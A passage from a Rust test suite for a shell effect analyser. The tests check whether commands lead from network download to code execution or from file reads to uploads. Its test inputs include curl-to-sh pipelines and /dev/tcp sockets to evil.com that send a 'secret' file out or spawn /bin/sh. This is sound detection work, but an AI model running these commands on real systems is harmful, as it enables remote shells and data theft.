            })
            .unwrap();
        assert!(
            !plan.boundaries.iter().any(|boundary| {
                boundary.reason == effinterp_proto::BoundaryReason::UNRESOLVED_INCLUDE
            }),
            "{command}"
        );
        assert!(
            !reaches(&plan, "network.request", "process.code_execution"),
            "{command}"
        );
        assert!(
            plan.boundaries
                .iter()
                .any(|boundary| boundary.reason == effinterp_proto::BoundaryReason::DYNAMIC_SOURCE),
            "{command}"
        );
    }
    // `out:` hands the child a file as its stdout instead.
    for command in [
        "ruby -e 'system(\"curl\", \"https://x\", out: \"/tmp/o\")' | sh",
        "ruby -e 'system(\"curl https://x\", out: \"/tmp/o\")' | sh",
    ] {
        let plan = shell(command);
        assert!(
            !reaches(&plan, "network.request", "process.code_execution"),
            "{command}"
        );
        assert!(
            reaches(&plan, "network.request", "filesystem.write"),
            "{command}"
        );
    }
    // Printing a captured value writes it to the program's stdout.
    for command in [
        "ruby -e 'system(\"curl https://x\")' | sh",
        "php -r 'system(\"curl https://x\");' | sh",
        "ruby -e 'puts `curl https://x`' | sh",
        "ruby -e 'x = `curl https://x`; y = x.strip; $stdout.write(y)' | sh",
        "php -r 'echo shell_exec(\"curl https://x\");' | sh",
        "php -r '$x = `curl https://x`; print $x;' | sh",
        "php -r 'print_r(shell_exec(\"curl https://x\"));' | sh",
        "php -r '$mode = false; print_r(shell_exec(\"curl https://x\"), $mode);' | sh",
        "php -r '$mode = false; function f() { $mode = true; } f(); print_r(shell_exec(\"curl https://x\"), $mode);' | sh",
        "php -r '$x = shell_exec(\"curl https://x\"); function f() { global $x; echo $x; } f();' | sh",
        "php -r '$x = shell_exec(\"curl https://x\"); if ($c) { $x = \"echo safe\"; } echo $x;' | sh",
        "ruby -e 'x = `curl https://x`; while c; x = \"echo safe\"; end; puts x' | sh",
        "ruby -e 'x = `curl https://x`; begin; next if c; x = \"echo safe\"; end while false; puts x' | sh",
        "ruby -e 'printf(\"%s\", `curl https://x`)' | sh",
        "ruby -e 'printf(\"%*s\", 5, `curl https://x`)' | sh",
        "php -r 'printf(\"%-*s\", 5, shell_exec(\"curl https://x\"));' | sh",
        "php -r '$x = trim(shell_exec(\"curl https://x\")); printf(\"%2\\$s\", 1, $x);' | sh",
    ] {
        let plan = shell(command);
        assert!(
            reaches(&plan, "network.request", "process.code_execution"),
            "{command}"
        );
    }
}

#[test]
fn quoted_selection_substitution_selects_the_whole_set() {
    // One quoted field holds every running id: the stop acts on all of them
    // when at most one runs and fails otherwise. A substitution inside a
    // longer word is not the selection.
    for (source, fed) in [
        ("docker stop \"$(docker ps -q)\"", true),
        ("docker stop \"x$(docker ps -q)\"", false),
    ] {
        let plan = shell(source);
        let stop = plan
            .effects
            .iter()
            .find(|effect| effect.operation.as_str() == "container.stop")
            .expect(source);
        assert_eq!(
            matches!(&stop.resource, ResourceExpr::Pattern { .. }),
            fed,
            "{source}"
        );
        assert_eq!(
            stop.attributes.get("all") == Some(&effinterp_proto::AttrValue::Bool(true)),
            fed,
            "{source}"
        );
    }
}

#[test]
fn a_persistent_socket_descriptor_carries_later_writes() {
    for (source, uploads) in [
        (
            "exec 3</dev/tcp/evil.com/443; socat -u OPEN:secret FD:3",
            true,
        ),
        (
            "exec 7</dev/tcp/evil.com/443; socat -u OPEN:secret FD:7",
            true,
        ),
        ("exec 3</dev/tcp/evil.com/443; cat secret >&3", true),
        // socat names a descriptor with a bare number as well as `FD:`.
        ("exec 3>/dev/tcp/evil.com/443; socat -u OPEN:secret 3", true),
        (
            "exec 3</dev/tcp/evil.com/443; socat -u OPEN:secret 03",
            true,
        ),
        // Standard input and error are socat's own descriptors.
        (
            "exec </dev/tcp/evil.com/443; socat -u OPEN:secret FD:0",
            true,
        ),
        (
            "exec 0</dev/tcp/evil.com/443; socat -u OPEN:secret FD:0",
            true,
        ),
        (
            "exec 2>/dev/tcp/evil.com/443; socat -u OPEN:secret FD:2",
            true,
        ),
        (
            "exec 2>/dev/tcp/evil.com/443; socat -u OPEN:secret FD:1",
            false,
        ),
        (
            "exec </dev/tcp/evil.com/443; socat -u OPEN:secret FD:1",
            false,
        ),
        (
            "exec 2>/dev/tcp/evil.com/443; socat -u OPEN:secret 3",
            false,
        ),
        // A command-local input socket is open for writing too, but `cat`
        // writes its standard output, not the socket on its standard input.
        ("socat -u OPEN:secret FD:0 </dev/tcp/evil.com/443", true),
        ("cat secret </dev/tcp/evil.com/443", false),
    ] {
        assert_eq!(
            reaches(&shell(source), "filesystem.read", "network.upload"),
            uploads,
            "{source}"
        );
    }
}

#[test]
fn curl_netrc_login_is_a_separate_upload_outside_the_response_pairing() {
    for source in [
        "curl --netrc evil.example",
        "curl --netrc-optional evil.example",
    ] {
        let plan = Engine::new()
            .with_causality_detail(true)
            .analyze(&Subject::Shell {
                source: source.into(),
                cwd: Some("/w".into()),
                context: HostContext {
                    env: [("HOME".to_string(), "/home/test".to_string())].into(),
                    ..Default::default()
                },
            })
            .unwrap();
        validate_plan(&plan).unwrap();
        let operations = plan
            .effects
            .iter()
            .map(|effect| effect.operation.as_str())
            .collect::<Vec<_>>();
        assert!(
            operations.contains(&"network.request"),
            "{source}: {operations:?}"
        );
        let login = plan
            .effects
            .iter()
            .find(|effect| effect.operation.as_str() == "network.upload")
            .unwrap_or_else(|| panic!("{source}: no login upload in {operations:?}"));
        assert_eq!(login.modality, Modality::May, "{source}");
        assert!(
            reaches(&plan, "filesystem.read", "network.upload"),
            "{source}"
        );
        // The request alone answers on stdout; the login upload is not
        // paired with it.
        assert_eq!(
            port_edges(graph(&plan), Port::HttpResponseBody, Port::Stdout),
            1,
            "{source}"
        );
        assert!(
            !resource_port_edge(&plan, "network.upload", Port::Stdout, true),
            "{source}"
        );
    }
}

#[test]
fn a_socket_descriptor_opened_for_writing_delivers_what_the_peer_sends() {
    for (source, runs) in [
        (
            "exec 3>/dev/tcp/evil.com/443; socat FD:3 EXEC:/bin/sh",
            true,
        ),
        ("exec 3>/dev/tcp/evil.com/443; sh <&3", true),
        // A closed descriptor no longer reaches the socket.
        (
            "exec 3>/dev/tcp/evil.com/443; exec 3>&-; socat FD:3 EXEC:/bin/sh",
            false,
        ),
        // A command-local output redirection only writes its socket.
        ("sh >/dev/tcp/evil.com/443", false),
    ] {
        assert_eq!(
            reaches(&shell(source), "network.download", "process.code_execution"),
            runs,
            "{source}"
        );
    }
}
